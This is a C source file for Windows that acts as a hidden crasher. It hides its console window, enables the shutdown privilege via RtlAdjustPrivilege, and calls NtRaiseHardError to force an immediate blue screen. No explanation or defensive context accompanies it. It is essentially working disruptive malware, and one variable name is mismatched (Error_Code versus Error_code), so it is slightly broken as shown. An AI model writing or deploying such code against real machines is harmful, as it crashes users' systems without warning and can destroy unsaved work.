#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);

HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");

NTSTATUS Set_Privilege(ULONG perm, BOOLEAN enable, BOOLEAN current_thread)
{
    BOOLEAN enabled;
    return RtlAdjustPrivilege(perm, enable, current_thread, &enabled);
}

NTSTATUS Trigger_BSOD(NTSTATUS Error_Code)
{
    ULONG response;
    return NtRaiseHardError(Error_code, 0, 0, 0, 6, &response);
}

VOID main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (Set_Privilege(19, TRUE, FALSE) == STATUS_SUCCESS)
    {
       Trigger_BSOD(0xC0000350);
    }
    FreeLibrary(ntdll);
    ExitProcess(1);
}
